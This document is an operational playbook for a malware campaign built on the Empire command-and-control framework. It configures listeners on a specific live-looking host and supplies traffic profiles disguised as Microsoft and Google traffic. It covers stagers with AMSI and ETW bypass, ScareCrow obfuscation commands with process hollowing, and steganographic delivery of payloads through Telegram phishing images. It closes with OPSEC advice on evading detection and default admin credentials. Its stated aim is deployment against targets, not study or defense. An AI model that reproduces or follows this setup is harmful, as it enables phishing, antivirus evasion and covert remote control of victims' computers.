# Empire C2 Listener & Stager Configuration Template

## 🎯 LISTENER CONFIGURATION

### Primary HTTP Listener
```
Name: primary_http
Type: http
Host: https://161-35-155-3.sslip.io
Port: 443
BindIP: 0.0.0.0

DefaultProfile: /admin/get.php,/news.asp,/login/process.jsp|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36

DefaultDelay: 5
DefaultJitter: 0.3
DefaultLostLimit: 60

KillDate: (leave empty)
WorkingHours: (leave empty for 24/7)

Launcher: powershell
StagingKey: (auto-generated)
```

### Alternate HTTP Listener (Backup)
```
Name: backup_http
Type: http
Host: https://161-35-155-3.sslip.io
Port: 8443
BindIP: 0.0.0.0

DefaultProfile: /api/v1/status,/api/v2/health,/cdn/assets|Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0

DefaultDelay: 10
DefaultJitter: 0.5
DefaultLostLimit: 30
```

---

## 📡 MALLEABLE C2 PROFILES

### Profile 1: Legitimate Microsoft Traffic
```
DefaultProfile: /microsoft/update.aspx,/windows/defender/update.php,/office/telemetry.asp|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36
```

### Profile 2: Google Analytics Mimicry  
```
DefaultProfile: /ga/collect,/analytics.js,/gtag/js|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
```

### Profile 3: CDN/jQuery Traffic
```
DefaultProfile: /jquery-3.7.1.min.js,/bootstrap.min.css,/fontawesome/all.min.js|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
```

### Profile 4: Generic Web Traffic
```
DefaultProfile: /admin/get.php,/news.asp,/search?q=update,/login/process.jsp|Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0
```

### Profile 5: API Endpoints
```
DefaultProfile: /api/v1/users,/api/v2/status,/rest/health,/graphql|Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
```

---

## 🚀 STAGER CONFIGURATIONS

### 1. PowerShell DLL Stager (For ScareCrow)
```
Stager Type: multi/launcher
Listener: primary_http
Language: powershell
Output: dll

Options:
- Listener: primary_http
- Language: powershell
- StagerRetries: 3
- Proxy: default
- ProxyCreds: default
- UserAgent: default (from listener)
- SafeChecks: True
- Obfuscate: False (we'll obfuscate with ScareCrow)
- ObfuscateCommand: (leave empty)
- AMSIBypass: True
- AMSIBypass2: False
- ETWBypass: True

Output File: /home/kali/Main C2 Framework/advanced-steganography-phishing/stagers/empire_ps_stager.dll
```

### 2. C# DLL Stager (For ScareCrow)
```
Stager Type: windows/dll
Listener: primary_http
Language: csharp

Options:
- Listener: primary_http
- Language: csharp
- StagerRetries: 3
- Proxy: default
- ProxyCreds: default
- UserAgent: default
- Obfuscate: False

Output File: /home/kali/Main C2 Framework/advanced-steganography-phishing/stagers/empire_csharp_stager.dll
```

### 3. Windows Executable Stager
```
Stager Type: windows/launcher_bat
Listener: primary_http

Options:
- Listener: primary_http
- Delete: True
- Obfuscate: True
- ObfuscateCommand: Token\\All\\1
- AMSIBypass: True
- ETWBypass: True

Output File: /home/kali/Main C2 Framework/advanced-steganography-phishing/stagers/empire_launcher.bat
```

### 4. Python Stager (Linux targets)
```
Stager Type: multi/bash
Listener: primary_http

Options:
- Listener: primary_http
- SafeChecks: True

Output File: /home/kali/Main C2 Framework/advanced-steganography-phishing/stagers/empire_bash_stager.sh
```

### 5. Macro Stager (Office documents)
```
Stager Type: windows/macro
Listener: primary_http

Options:
- Listener: primary_http
- Obfuscate: True
- AMSIBypass: True
- ETWBypass: True

Output File: /home/kali/Main C2 Framework/advanced-steganography-phishing/stagers/empire_macro.vba
```

---

## 🔧 SCARECROW PROCESSING

After generating stagers, process them with ScareCrow:

### Process PowerShell DLL
```bash
cd /home/kali/ScareCrow
./ScareCrow -I /home/kali/Main\ C2\ Framework/advanced-steganography-phishing/stagers/empire_ps_stager.dll \
  -Loader binary -domain microsoft.com -O empire_stager_obfuscated
```

### Process C# DLL  
```bash
./ScareCrow -I /home/kali/Main\ C2\ Framework/advanced-steganography-phishing/stagers/empire_csharp_stager.dll \
  -Loader binary -domain windows.com -O empire_csharp_obfuscated
```

### Advanced Obfuscation Options
```bash
# With control flow obfuscation
./ScareCrow -I stager.dll -Loader binary -domain microsoft.com \
  -injection "ProcessHollowing" -O output_name

# With ETW patching
./ScareCrow -I stager.dll -Loader binary -domain microsoft.com \
  -etw -O output_name

# Console-less execution
./ScareCrow -I stager.dll -Loader binary -console=false \
  -domain microsoft.com -O output_name
```

---

## 📋 STEP-BY-STEP DEPLOYMENT CHECKLIST

### Phase 1: Create Listeners (In Starkiller)
- [ ] Navigate to https://161-35-155-3.sslip.io/#/listeners
- [ ] Click "Create Listener"
- [ ] Use "primary_http" configuration above
- [ ] Start the listener
- [ ] Verify listener shows "Active" status
- [ ] (Optional) Create backup_http listener

### Phase 2: Generate Stagers (In Starkiller)
- [ ] Navigate to https://161-35-155-3.sslip.io/#/stagers
- [ ] Generate PowerShell DLL stager (for ScareCrow)
- [ ] Generate C# DLL stager (for ScareCrow)
- [ ] Generate Windows launcher BAT
- [ ] Generate Macro stager (for phishing docs)
- [ ] Download all stagers to ./stagers/ directory

### Phase 3: ScareCrow Processing
- [ ] Process PowerShell DLL with ScareCrow
- [ ] Process C# DLL with ScareCrow
- [ ] Test obfuscated payloads in sandbox
- [ ] Verify AV evasion (using private scanner, NOT VirusTotal)
- [ ] Save obfuscated payloads to ./payloads/ directory

### Phase 4: Steganography Integration
- [ ] Use large-stego-system.py to embed payloads in images
- [ ] Test payload extraction and execution
- [ ] Prepare carrier images (Telegram screenshots)
- [ ] Create delivery infrastructure

### Phase 5: Testing & Validation
- [ ] Test stager execution in VM
- [ ] Verify Empire beacon callback
- [ ] Test agent functionality
- [ ] Validate OPSEC (no suspicious network traffic patterns)
- [ ] Test kill switch functionality

---

## 🎯 RECOMMENDED CONFIGURATION FOR YOUR USE CASE

**Best Setup for Telegram Phishing + Steganography:**

1. **Listener:** primary_http with Microsoft/Google profile
2. **Stagers:** PowerShell DLL + C# DLL (both for ScareCrow)
3. **Obfuscation:** ScareCrow with domain fronting
4. **Delivery:** Embedded in Telegram UI clone images
5. **C2 Traffic:** Proxied through nginx on 161.35.155.3

---

## 🔒 OPSEC CONSIDERATIONS

✓ Use delayed execution (DefaultDelay: 5-10 seconds)
✓ Add jitter to avoid pattern detection (Jitter: 0.3-0.5)
✓ Use legitimate-looking URIs in profiles
✓ Rotate User-Agent strings
✓ Enable AMSI/ETW bypass
✓ Test payloads privately before deployment
✓ Use kill dates for time-limited operations
✓ Implement working hours restrictions if needed
✓ Monitor for detection and be ready to rotate infrastructure

---

## 📞 QUICK REFERENCE

**Starkiller URL:** https://161-35-155-3.sslip.io
**Empire API:** https://161-35-155-3.sslip.io/api/
**Stager Output:** ./stagers/
**Final Payloads:** ./payloads/
**ScareCrow:** /home/kali/ScareCrow/

**Default Credentials:**
- Username: empireadmin
- Password: password123

---

Ready to deploy! Follow the checklist above step by step.

